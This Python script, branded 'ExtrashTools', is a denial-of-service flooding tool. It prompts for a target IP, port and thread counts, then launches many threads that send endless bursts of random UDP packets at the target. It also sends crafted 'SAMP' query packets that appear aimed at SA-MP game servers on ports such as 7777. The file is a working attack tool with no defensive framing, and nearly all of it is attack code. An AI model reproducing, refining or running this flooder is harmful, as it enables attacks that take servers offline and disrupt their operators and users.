import socket, struct, codecs, sys, threading, random, time, os

Attack = [
 codecs.decode('53414d5090d91d4d611e700a465b00', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e63', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e69', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e72', 'hex_codec'),
 codecs.decode('081e62da', 'hex_codec'),
 codecs.decode('081e77da', 'hex_codec'),
 codecs.decode('081e4dda', 'hex_codec'),
 codecs.decode('021efd40', 'hex_codec'),
 codecs.decode('081e7eda', 'hex_codec')]
 

os.system('cls' if os.name == 'nt' else 'clear')
sys.stdout.write("\x1b]2;[@] ExtrashTools. | User & Password: [root@admin]\x07")
print("""\033[95m
╔═╗═╗ ╦╔╦╗╦═╗╔═╗╔═╗╦ ╦
║╣ ╔╩╦╝ ║ ╠╦╝╠═╣╚═╗╠═╣
╚═╝╩ ╚═ ╩ ╩╚═╩ ╩╚═╝╩ ╩
\u001b[31m
╦ ╦╦╔╦╗╦ ╦            
║║║║ ║ ╠═╣            
╚╩╝╩ ╩ ╩ ╩            
\033[95m
╔╗ ╦╔╦╗╔═╗╔═╗═╗ ╦     
╠╩╗║║║║╔═╝╔═╝╔╩╦╝     
╚═╝╩╩ ╩╚═╝╚═╝╩ ╚═     """)
ip = str(input("• Extrash | Host/Ip > \033[36"))
port = int(input("• Extrash | Port > \033[36"))
times = int(input("• Extrash | Connections > \033[36"))
threads = int(input("• Extrash | Threads > \033[36"))

def run():
	data = random._urandom(1490)
	i = random.choice(("\033[36m[*]","\033[36m[!]","\033[36m[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Attack Launched To Server {}:{}".format(ip, port))
		except:
			print("\u001b[31m[!] Server Has Been Maintenace\033[95m")

def runx():
	data = random._urandom(1024)
	i = random.choice(("\033[36m[*]","\033[36m[!]","\033[36m[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Attack Launched To Server {}:{}".format(ip, port))
		except:
			print("\u001b[31m[!] Server Has Been Maintenace\033[95m")

def runxz():
	data = random._urandom(666)
	i = random.choice(("\033[36m[*]","\033[36m[!]","\033[36m[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Attack Launched To Server {}:{}".format(ip, port))
		except:
			print("\u001b[31m[!] Server Has Been Maintenace\033[95m")

def runxy():
	data = random._urandom(818)
	i = random.choice(("\033[36m[*]","\033[36m[!]","\033[36m[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Attack Launched To Server {}:{}".format(ip, port))
		except:
			print("\u001b[31m[!] Server Has Been Maintenace\033[95m")

def runxo():
	data = random._urandom(999)
	i = random.choice(("\033[36m[*]","\033[36m[!]","\033[36m[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Attack Launched To Server {}:{}".format(ip, port))
		except:
			print("\u001b[31m[!] Server Has Been Maintenace\033[95m")

def runxi():
	data = random._urandom(1205)
	i = random.choice(("\033[36m[*]","\033[36m[!]","\033[36m[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Attack Launched To Server {}:{}".format(ip, port))
		except:
			print("\u001b[31m[!] Server Has Been Maintenace\033[95m")

def runxq():
	data = random._urandom(1460)
	i = random.choice(("\033[36m[*]","\033[36m[!]","\033[36m[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Attack Launched To Server {}:{}".format(ip, port))
		except:
			print("\u001b[31m[!] Server Has Been Maintenace\033[95m")

def runxa():
	data = random._urandom(666)
	i = random.choice(("\033[36m[*]","\033[36m[!]","\033[36m[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Attack Launched To Server {}:{}".format(ip, port))
		except:
			print("\u001b[31m[!] Server Has Been Maintenace\033[95m")

def runxv():
	data = random._urandom(1304)
	i = random.choice(("\033[36m[*]","\033[36m[!]","\033[36m[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Attack Launched To Server {}:{}".format(ip, port))
		except:
			print("\u001b[31m[!] Server Has Been Maintenace\033[95m")

class Bimzzx(threading.Thread):
    def run(self):
        while True:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            msg = Attack[random.randrange(0, 3)]
            sock.sendto(msg, (ip, int(port)))
            if int(port) == 7777:
                sock.sendto(Attack[5], (ip, int(port)))
            elif int(port) == 7796:
                sock.sendto(Attack[4], (ip, int(port)))
            elif int(port) == 7771:
                sock.sendto(Attack[6], (ip, int(port)))
            elif int(port) == 7784:
                sock.sendto(Attack[7], (ip, int(port)))

for _x in range(threads):
	threading.Thread(target=run).start()
	threading.Thread(target=runx).start()
	threading.Thread(target=runxz).start()
	threading.Thread(target=runxy).start()
	threading.Thread(target=runxi).start()
	threading.Thread(target=runxo).start()
	threading.Thread(target=runxq).start()
	threading.Thread(target=runxa).start()
	threading.Thread(target=runxv).start()

for _new in range(threads):
	threading.Thread(target=run).start()
	threading.Thread(target=runx).start()
	threading.Thread(target=runxz).start()
	threading.Thread(target=runxy).start()
	threading.Thread(target=runxi).start()
	threading.Thread(target=runxo).start()
	threading.Thread(target=runxq).start()
	threading.Thread(target=runxa).start()
	threading.Thread(target=runxv).start()

if __name__ == '__main__':
    try:
        for x in range(450):
            extrash = Bimzzx()
            extrash.start()
            time.sleep(0.1)
    except KeyboardInterrupt:
        os.system('cls' if os.name == 'nt' else 'clear')
        print ("╔════════════════════════════════════╗")
        print ("         ╔═╗╔╦╗╔═╗╔═╗╔═╗╔═╗╔╦╗        ")
        print ("         ╚═╗ ║ ║ ║╠═╝╠═╝║╣  ║║        ")
        print ("         ╚═╝ ╩ ╚═╝╩  ╩  ╚═╝═╩╝        ")
        print ("╚════════════════════════════════════╝")
